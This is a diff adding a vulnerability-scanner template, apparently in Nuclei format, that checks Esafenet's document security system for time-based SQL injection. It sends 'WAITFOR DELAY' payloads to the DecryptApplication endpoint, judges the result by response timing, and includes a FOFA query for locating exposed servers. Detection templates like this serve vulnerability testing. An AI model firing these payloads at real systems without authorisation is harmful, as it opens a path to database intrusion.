@@ -1,0 +1,59 @@
+id: poc-yaml-yisaitong-esafenet-delalldecryptapplication-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 DelAllDecryptApplication SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 亿赛通电子文档安全管理系统
+    fofa-query: app="亿赛通-电子文档安全管理系统"
+
+variables:
+  t1: "{{rand_int(3,8)}}"
+  t2: "{{rand_int(3,8)}}"
+  t3: "{{to_number(t1) + 2}}"
+  t4: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        allCheckbox=1'WAITFOR+DELAY'0%3a0%3a{{t1}}'--&fromurl=DeletedDecryptApplication2.jsp&command=DelAllDecryptApplication
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+          - 404
+      - type: word
+        part: header
+        words:
+          - "Path=/CDGServer3"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t3)"
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        allCheckbox=1'WAITFOR+DELAY'0%3a0%3a{{t2}}'--&fromurl=DeletedDecryptApplication2.jsp&command=DelAllDecryptApplication
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+          - 404
+      - type: word
+        part: header
+        words:
+          - "Path=/CDGServer3"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2)"
+          - "duration < to_number(t4)"
